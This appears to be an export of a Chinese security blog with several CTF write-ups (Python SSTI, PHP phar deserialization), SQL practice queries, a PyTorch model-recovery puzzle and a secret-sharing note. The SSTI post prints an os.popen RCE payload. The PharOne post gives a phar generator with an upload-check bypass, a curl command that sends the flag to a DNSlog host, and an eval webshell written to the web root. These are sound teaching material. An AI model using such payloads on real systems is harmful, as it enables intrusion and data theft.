<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&quot; &quot;</span>                  <span class="comment">#输入所有 subclasses 内容</span></span><br><span class="line">str_new = []</span><br><span class="line">sub_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[i]!=<span class="string">&quot;,&quot;</span> <span class="keyword">and</span> <span class="built_in">str</span>[i]!=<span class="string">&quot; &quot;</span>:</span><br><span class="line">        sub_str+=<span class="built_in">str</span>[i]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[i]==<span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">        str_new.append(sub_str)</span><br><span class="line">        sub_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">result = str_new.index(<span class="string">&quot;&lt;class&#x27;site._Printer&#x27;&gt;&quot;</span>,<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">str</span>))</span><br><span class="line">result</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获取到结果为 71，我们定位到 subclasses 中第71 个元素，并初始化这个类，调用他的全局变量 os 下的 popen 函数，这里使用‘ls’来查看所有文件。<br>于是构造 :<br>[].__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[‘os’].popen(‘ls’).read()<br>获得结果：<br><img src="/2023/09/18/python-template1/image4.jpg"><br>这里用空格隔开了几个文件，发现了有fl4g文件，我们在 popen 里使用 cat fl4g去读他里面的内容(记得要用%20 代替空格，不然 url 不一定在 safari 有效)<br>[].__class__.__mro__[1].__subclasses__()[71].__init__.__globals__[‘os’].popen(‘cat%20fl4g’’).read()<br>得到 flag：<br><img src="/2023/09/18/python-template1/image5.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>ssti</tag>
      </tags>
  </entry>
  <entry>
    <title>【newstarctf2023】PharOne (DNS log外带法)</title>
    <url>/2023/10/29/newstarctf2023-pharone/</url>
    <content><![CDATA[<h1 id="【newstarctf2023】PharOne-DNS-log外带法"><a href="#【newstarctf2023】PharOne-DNS-log外带法" class="headerlink" title="【newstarctf2023】PharOne (DNS log外带法)"></a>【newstarctf2023】PharOne (DNS log外带法)</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>打开靶机，看到一个文件上传的页面，上传一句话木马文件后发现啥shell 拿不到，变换思路，看源码中有注释提示：class.php，url 请求 class.php 发现代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到这个代码，就知道这个题要用 phar 去做了。</p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>留意到了 unlink 这个方法和 flag 这个类，这个方法是可以触发 phar 的反序列化的，这里列举一下可以触发 phar反序列化 的方法：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">fopen() unlink() stat() fstat() fseek() rename() opendir() rmdir() mkdir() </span><br><span class="line"></span><br><span class="line">file_put_contents() file_get_contents() </span><br><span class="line"></span><br><span class="line">file_exists() fileinode() include() </span><br><span class="line">require() include_once require_once() </span><br><span class="line"></span><br><span class="line">filemtime() fileowner() fileperms() </span><br><span class="line">filesize() is_dir() scandir() rmdir() </span><br><span class="line"></span><br><span class="line">highlight_file()</span><br><span class="line"></span><br><span class="line">还有一个类：</span><br><span class="line">new DirectoryIteartor() </span><br></pre></td></tr></table></figure>

<p>基本思路就是通过post 上传 phar 文件，然后触发 unlink 反序列化，在 Flag 类中触发exec($this-&gt;cmd); 实现 RCE。</p>
<p>phar 文件的构成：</p>
<p><img src="/2023/10/29/newstarctf2023-pharone/1.jpg"></p>
<p>在 phar 文件中的.metadata中可以写入 php 语句，当执行 phar:&#x2F;&#x2F;文件名 去读取该 phar 文件时，上述讲到的方法就会检查.metadata是否存在，如果存在，就触发反序列化。</p>
<p>先写一段 php 代码用于生成 phar 文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;sleep 5&quot;</span>; <span class="comment">#判断无回显是否成功执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">#触发 unlink</span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">#生成 phar 文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="comment">#设置 phar 文件头，这里用 GIF89a 做文件头欺骗，防止有文件头检查</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;__HALT_COMPILER();&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">#设置内容，这里会签名</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">#随便写点 txt，让他通过检查</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>写完后改后缀为.gif，通过文件上传页面上传该 phar 文件，结果上传不上去，发现是他对内容做了检查，检查了 phar 的文件头：__HALT_COMPILER();</p>
<p>这里需要绕过检查，使用 linux 的gzip压缩 phar 文件来绕过检查，除了 gzip 以外，将Phar压缩成<strong>tar、bzip2</strong>后均能够触发反序列化，大致原理就是在执行phar:&#x2F;&#x2F;文件时，会判断这个文件是不是标准的 phar 文件，在判断过程中对 zip，gz，bz 这三种压缩形式的幻数做了处理，分别调用了他们对应的decompress过滤器做解压缩处理。</p>
<p>我们这里将生成的 phar 文件拖到 kali 用 gzip 进行压缩，然后上传，改后缀上传，文件名为：a.gif，发现成功上传，然后构造 payload：<br>file&#x3D;phar:&#x2F;&#x2F;uploads&#x2F;改名后的文件，发现空了 5 秒，成功rce。</p>
<p>这里另外一个难点就是无回显 RCE，本人当时一直弹不动 shell，所以就写了一个 DNSLOG 外带，具体指令为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">curl http://9esedf.ceye.io/`cat $(find / -name flag*)`</span><br></pre></td></tr></table></figure>

<p>这里的 <a href="http://9esedf.ceye.io/">http://9esedf.ceye.io/</a> 是 dnslog 网站( <a href="http://ceye.io/">http://ceye.io</a> )分配给我的域名。这里注意 dnslog 外带只能带一个参数出来，所以如果你用 ls 只能获得到 ls 的第一个参数。之后用 find 指令去找 flag，然后带出来，获得 flag，结果如下：</p>
<p><img src="/2023/10/29/newstarctf2023-pharone/2.jpg"></p>
<h2 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h2><p>官方题解上说：</p>
<p>“Web根目录可写，可以直接写一个WebShell进去”</p>
<p>构造 cmd 为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>然后 getshell，确实没有往这方面想，是我想复杂了，学到了 QAQ</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>phar</tag>
        <tag>反序列化</tag>
        <tag>文件上传</tag>
        <tag>DNS log 外带</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】robotstxt</title>
    <url>/2023/09/15/robotstxt/</url>
    <content><![CDATA[<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>robots.txt 文件是一个文本文件，使用任何一个常见的文 本编辑器，比如 Windows 系统自带的 Notepad，就可以创建和编辑它。robots.txt 是一个协议，而不是一个命令。 robots.txt 是搜索引擎中访问网站的时候要查看的第一个 文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件 是可以被查看的。</p>
<h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>robots.txt 常用于过滤掉不希望搜索引擎能搜索出来的文件，这种文件常常是敏感的，本体中，如下：<br><img src="/2023/09/15/robotstxt/image1.jpg"><br>在获取到&#x2F;fl0g.php的信息后，放在url里 get 请求即可获取到 flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>robots.txt</tag>
      </tags>
  </entry>
  <entry>
    <title>中级 SQL 语句</title>
    <url>/2023/10/12/%E4%B8%AD%E7%BA%A7-SQL-%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<h2 id="常用的-SQL-命令"><a href="#常用的-SQL-命令" class="headerlink" title="常用的 SQL 命令"></a>常用的 SQL 命令</h2><p>基本思路：</p>
<p>JOIN 做 关联查询，WHERE 做条件限制，函数做计算。</p>
<p>查询每个部门的平均年龄</p>
<p>使用 AVG 函数来求均值，JOIN 表加条件，GROUP BY 来按部门展示</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 部门信息.部门编号,部门信息.部门名称,</span><br><span class="line">    <span class="built_in">AVG</span>(员工信息.年龄) <span class="keyword">AS</span> 平均年龄</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">    员工信息</span><br><span class="line"><span class="keyword">JOIN</span></span><br><span class="line">    部门信息 <span class="keyword">ON</span> 员工信息.所在部门 <span class="operator">=</span> 部门信息.部门编号</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">    部门信息.部门编号, 部门信息.部门名称;</span><br></pre></td></tr></table></figure>

<p>mitmproxy</p>
<p>查询和李文萌不在一个部门的员工</p>
<p>展示除了特定值以外数据，使用    ！&#x3D;    来限制，先在部门表将和李文萌不在一个部门的员工给选择出来，再通过关联查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 员工姓名</span><br><span class="line"><span class="keyword">FROM</span> 员工信息</span><br><span class="line"><span class="keyword">WHERE</span> 所在部门 <span class="operator">!=</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> 所在部门</span><br><span class="line">    <span class="keyword">FROM</span> 员工信息</span><br><span class="line">    <span class="keyword">WHERE</span> 员工姓名 <span class="operator">=</span> <span class="string">&#x27;李文萌&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">AND</span> 员工姓名 <span class="operator">!=</span> <span class="string">&#x27;李文萌&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查询每个员工的工号，姓名，所在部门名称，以及其部门领导姓名</p>
<p>用自连接查询，像加入其他表一样加入自己的也是可以的</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    e.员工工号,</span><br><span class="line">    e.员工姓名,</span><br><span class="line">    d.部门名称,</span><br><span class="line">    l.员工姓名 <span class="keyword">AS</span> 部门领导姓名</span><br><span class="line"><span class="keyword">FROM</span> 员工信息 <span class="keyword">AS</span> e</span><br><span class="line"><span class="keyword">JOIN</span> 部门信息 <span class="keyword">AS</span> d <span class="keyword">ON</span> e.所在部门 <span class="operator">=</span> d.部门编号</span><br><span class="line"><span class="keyword">JOIN</span> 员工信息 <span class="keyword">AS</span> l <span class="keyword">ON</span> d.部门领导工号 <span class="operator">=</span> l.员工工号;</span><br></pre></td></tr></table></figure>

<p>找出哪个部门没有员工？</p>
<p>用 IS NULL</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> d.部门编号, d.部门名称</span><br><span class="line"><span class="keyword">FROM</span> 部门信息 <span class="keyword">AS</span> d</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> 员工信息 <span class="keyword">AS</span> e <span class="keyword">ON</span> d.部门编号 <span class="operator">=</span> e.所在部门</span><br><span class="line"><span class="keyword">WHERE</span> e.员工工号 <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>查询在第5学期选修了“数据库系统原理”和“软件工程导论”这两门课程的学生学号、学生姓名、所在专业名称。</p>
<p>这里用 AND 链接做条件限制</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> s.student_id, s.student_name, m.major_name</span><br><span class="line"><span class="keyword">FROM</span> students_info s</span><br><span class="line"><span class="keyword">JOIN</span> grades_info g1 <span class="keyword">ON</span> s.student_id <span class="operator">=</span> g1.student_id</span><br><span class="line"><span class="keyword">JOIN</span> grades_info g2 <span class="keyword">ON</span> s.student_id <span class="operator">=</span> g2.student_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info c1 <span class="keyword">ON</span> g1.course_id <span class="operator">=</span> c1.course_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info c2 <span class="keyword">ON</span> g2.course_id <span class="operator">=</span> c2.course_id</span><br><span class="line"><span class="keyword">JOIN</span> major_info m <span class="keyword">ON</span> s.major_id <span class="operator">=</span> m.major_id</span><br><span class="line"><span class="keyword">WHERE</span> c1.course_name <span class="operator">=</span> <span class="string">&#x27;数据库原理&#x27;</span> <span class="keyword">AND</span> c1.course_term <span class="operator">=</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">AND</span> c2.course_name <span class="operator">=</span> <span class="string">&#x27;软件工程&#x27;</span> <span class="keyword">AND</span> c2.course_term <span class="operator">=</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>查询在选修了“数据库系统原理”和“软件工程导论”这两门课程的学生学号、学生姓名、以及各科课程的成绩。</p>
<p>如何拆解，首先我们先考虑条件：“选修了“数据库系统原理”和“软件工程导论”这两门课程的学生”，先用 WHERE 语句按照条件查询出来，然后再去 JOIN 其他表展示剩下的数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    s.student_id, </span><br><span class="line">    s.student_name,</span><br><span class="line">    c.course_name,</span><br><span class="line">    g.grades</span><br><span class="line"><span class="keyword">FROM</span> students_info s</span><br><span class="line"><span class="keyword">JOIN</span> grades_info g <span class="keyword">ON</span> s.student_id <span class="operator">=</span> g.student_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info c <span class="keyword">ON</span> g.course_id <span class="operator">=</span> c.course_id</span><br><span class="line"><span class="keyword">WHERE</span> s.student_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> student_id</span><br><span class="line">    <span class="keyword">FROM</span> grades_info</span><br><span class="line">    <span class="keyword">JOIN</span> courses_info <span class="keyword">ON</span> grades_info.course_id <span class="operator">=</span> courses_info.course_id</span><br><span class="line">    <span class="keyword">WHERE</span> course_name <span class="operator">=</span> <span class="string">&#x27;数据库原理&#x27;</span></span><br><span class="line">) <span class="keyword">AND</span> s.student_id <span class="keyword">IN</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> student_id</span><br><span class="line">    <span class="keyword">FROM</span> grades_info</span><br><span class="line">    <span class="keyword">JOIN</span> courses_info <span class="keyword">ON</span> grades_info.course_id <span class="operator">=</span> courses_info.course_id</span><br><span class="line">    <span class="keyword">WHERE</span> course_name <span class="operator">=</span> <span class="string">&#x27;软件工程&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>求出每门课的课程号、选课人数。</p>
<p>用 COUNT 去统计，这里使用左链接显示没有人选的科目</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    c.course_id,</span><br><span class="line">    c.course_name,</span><br><span class="line">    <span class="built_in">COUNT</span>(g.student_id) <span class="keyword">AS</span> number_of_students</span><br><span class="line"><span class="keyword">FROM</span> courses_info c</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> grades_info g <span class="keyword">ON</span> c.course_id <span class="operator">=</span> g.course_id</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> c.course_id, c.course_name;</span><br></pre></td></tr></table></figure>

<p>查询所有学生的选修课程情况和成绩，若学生没有选修任何课程，也要包含在其中。</p>
<p>也是左链接，同理。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    c.course_id,</span><br><span class="line">    c.course_name,</span><br><span class="line">    s.student_id,</span><br><span class="line">    s.student_name</span><br><span class="line"><span class="keyword">FROM</span> grades_info g</span><br><span class="line"><span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> courses_info c <span class="keyword">ON</span> g.course_id <span class="operator">=</span> c.course_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> students_info s <span class="keyword">ON</span> g.student_id <span class="operator">=</span> s.student_id</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查询被选修了的课程的选修情况和所有开设课程名，包括没有被选修的课程</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    c.course_name,</span><br><span class="line">    GROUP_CONCAT(s.student_name) <span class="keyword">AS</span> students_enrolled</span><br><span class="line"><span class="keyword">FROM</span> courses_info c</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> grades_info g <span class="keyword">ON</span> c.course_id <span class="operator">=</span> g.course_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> students_info s <span class="keyword">ON</span> g.student_id <span class="operator">=</span> s.student_id</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> c.course_name</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> c.course_name;</span><br></pre></td></tr></table></figure>

<p>在学生信息表中，查询年龄比“王林”大的学生的学号，姓名，年龄</p>
<p>用 YEAR()函数转换为 int 再相减</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    s1.student_id,</span><br><span class="line">    s1.student_name,</span><br><span class="line">    <span class="keyword">YEAR</span>(<span class="built_in">CURRENT_DATE</span>) <span class="operator">-</span> <span class="keyword">YEAR</span>(s1.birthday) <span class="keyword">AS</span> age</span><br><span class="line"><span class="keyword">FROM</span> students_info s1</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> students_info s2 <span class="keyword">ON</span> s1.student_id <span class="operator">!=</span> s2.student_id</span><br><span class="line"><span class="keyword">WHERE</span> s2.student_name <span class="operator">=</span> <span class="string">&#x27;王林&#x27;</span> <span class="keyword">AND</span> s1.birthday <span class="operator">&gt;</span> s2.birthday</span><br></pre></td></tr></table></figure>
<p>将“student_view3”视图的内容修改为：“数据库系统原理”课程所选修学生的专业名称和各个专业的选课学生人数</p>
<p>这里用 CREATE OR REPLACE 修改视图，然后 FROM 这边可以从一个查询结果里的表选取，用 AS t 重新命名为 t，这里就可以体现出数据库查询思路了，由简单再到复杂，将复杂的语句拆开成几个部分，实现了各个部分再合并。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">VIEW</span> student_view3 <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> t.major_name,<span class="built_in">COUNT</span>(t.student_id) <span class="keyword">AS</span> numbers</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">(<span class="keyword">SELECT</span> m.major_name, s.student_id</span><br><span class="line"><span class="keyword">FROM</span> students_info <span class="keyword">AS</span> s</span><br><span class="line"><span class="keyword">JOIN</span> major_info <span class="keyword">AS</span> m <span class="keyword">ON</span> s.major_id <span class="operator">=</span> m.major_id) <span class="keyword">AS</span> t</span><br><span class="line"><span class="keyword">JOIN</span> grades_info <span class="keyword">AS</span> g <span class="keyword">ON</span> t.student_id <span class="operator">=</span> g.student_id</span><br><span class="line"><span class="keyword">JOIN</span> courses_info <span class="keyword">AS</span> c <span class="keyword">ON</span> c.course_id <span class="operator">=</span> g.course_id</span><br><span class="line"><span class="keyword">WHERE</span> c.course_name <span class="operator">=</span> &quot;数据库原理&quot;</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> t.major_name;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据库基础</category>
        <category>SQL实践部分</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>【网信中山】Pytorch 神经网络复原</title>
    <url>/2023/10/29/%E7%BD%91%E4%BF%A1%E4%B8%AD%E5%B1%B1-AI-%E9%A2%98/</url>
    <content><![CDATA[<h1 id="【网信中山】Misc-Pytorch-神经网络复原"><a href="#【网信中山】Misc-Pytorch-神经网络复原" class="headerlink" title="【网信中山】Misc Pytorch 神经网络复原"></a>【网信中山】Misc Pytorch 神经网络复原</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>中山杯打到后期，放出了一道 misc 题，下载附件拿到一个压缩包。解压获得了如下文件：</p>
<ul>
<li>.npy 文件 : 用于存储 numpy 数组</li>
<li>label.json 文件 : 用于存储模型标签</li>
<li>MyLeNet.pt 文件 :  PyTorch 的序列化文件格式，用于保存和加载 PyTorch 模型的参数和状态。这种格式方便用户在训练过程中保存检查点，以及在后续的推理或继续训练过程中加载模型。</li>
</ul>
<h2 id="思考过程"><a href="#思考过程" class="headerlink" title="思考过程"></a>思考过程</h2><p>在这里思路其实很明显： 先根据 pt 文件复原模型，然后将 npy 文件全部喂给模型，得到的输出根据 label.json文件做标签分类，然后再拼接获得flag。</p>
<p>这里最难的就是模型的复原，完全不知道他使用的哪个非线性方法，我试了很久也没试出来，跑出来的结果对称性非常强，一度让我以为是还要解码，最后遗憾告终，对这类题还是太陌生了。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>比赛结束后看了唯一做出来的那队的 WP，才发现居然要逆MyLeNet.pt文件，直接把 MyLeNet 文件放到 CyberChef 里，看内容，发现里面有 sigmoid 和 relu 非线性方法，由于只有两种非线性方法，一共四个层，做一个排列组合就能够拿到 flag 了，</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模型结构，与提供的 MyLeNet.pt 结构匹配</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLeNet</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MyLeNet, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">1</span>, <span class="number">6</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">6</span>, <span class="number">16</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">        self.fc1 = nn.Linear(<span class="number">256</span>, <span class="number">120</span>)</span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">120</span>, <span class="number">84</span>)</span><br><span class="line">        self.fc3 = nn.Linear(<span class="number">84</span>, <span class="number">62</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># 这个地方要排列组合去尝试</span></span><br><span class="line">        x = torch.sigmoid(self.conv1(x))</span><br><span class="line">        x = torch.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = torch.relu(self.conv2(x))</span><br><span class="line">        x = torch.max_pool2d(x, <span class="number">2</span>)</span><br><span class="line">        x = x.view(-<span class="number">1</span>, <span class="number">256</span>)</span><br><span class="line">        x = torch.sigmoid(self.fc1(x))</span><br><span class="line">        x = torch.relu(self.fc2(x))</span><br><span class="line">        x = self.fc3(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载模型参数</span></span><br><span class="line">model = MyLeNet()</span><br><span class="line">model.load_state_dict(torch.load(<span class="string">&#x27;MyLeNet.pt&#x27;</span>, map_location=torch.device(<span class="string">&#x27;cpu&#x27;</span>)))</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"><span class="comment"># 定义一个空字符串用于拼接结果</span></span><br><span class="line">predicted_string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载标签映射</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;label.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    label_map = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载并预测样本</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">56</span>):</span><br><span class="line">    sample = np.load(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>.npy&quot;</span>)</span><br><span class="line">    sample = torch.tensor(sample, dtype=torch.float32).unsqueeze(<span class="number">0</span>).unsqueeze(<span class="number">0</span>)  <span class="comment"># 添加 batch 和 channel 维度</span></span><br><span class="line">    prediction = model(sample)</span><br><span class="line">    predicted_label = torch.argmax(prediction, dim=<span class="number">1</span>).item()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 根据标签映射找到预测的字符</span></span><br><span class="line">    predicted_character = [char <span class="keyword">for</span> char, label <span class="keyword">in</span> label_map.items() <span class="keyword">if</span> label == predicted_label][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将预测的字符添加到字符串中</span></span><br><span class="line">    predicted_string += predicted_character</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印拼接后的完整字符串</span></span><br><span class="line"><span class="built_in">print</span>(predicted_string)</span><br></pre></td></tr></table></figure>

<p>然后试的话发现其中 sigmoid+relu+sigmoid+relu 这个组合的结果为:</p>
<pre><code>ZmxhZ3thNzkzZjI1Ny01Nzg4LWYwZjYtY2E5Zi00YTgyZWE3MmUwYzZ9
</code></pre>
<p>眼熟的 base64，拿去 base64 解码即可获得 flag：</p>
<p>flag{a793f257-5788-f0f6-ca9f-4a82ea72e0c6}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>神经网络</tag>
      </tags>
  </entry>
  <entry>
    <title>【隐私计算】 秘密共享方案</title>
    <url>/2023/11/13/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97-%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/</url>
    <content><![CDATA[<h1 id="【隐私计算】-秘密共享方案"><a href="#【隐私计算】-秘密共享方案" class="headerlink" title="【隐私计算】 秘密共享方案"></a>【隐私计算】 秘密共享方案</h1><h2 id="Shamir-秘密共享方案"><a href="#Shamir-秘密共享方案" class="headerlink" title="Shamir 秘密共享方案"></a>Shamir 秘密共享方案</h2><p>Shamir’s Secret Sharing Scheme is based on Lagrange Interception.</p>
<p>Now suppose there are $n$ people, and $t$ is the threshold for secret recovery</p>
<p>Construct a polynimal at first, the form like:</p>
<p>$$ P(x) &#x3D; a_{t-1}x^{t-1} + a_{t-2}x^{t-2} + \cdots + a_2x^2 + a_1x + a_0 $$</p>
<p>Setting $a_0$ as the secret. Each person is allocated a secret share represented as $(i, a_{i}x^{i})$.</p>
<p>For the secret recovery, we need to construct a Lagrange Interception to compute the coefficients $a_0$(secret). The Lagrange Interpolation method is as follows</p>
<p>$$L(x) &#x3D; \sum_{j&#x3D;0}^{n} y_j \prod_{\substack{i&#x3D;0 \ i \neq j}}^{n} \frac{x - x_i}{x_j - x_i}$$</p>
<p>In the above formula, by setting $x &#x3D; 0$, the value of  $a_0$ can be calculated.</p>
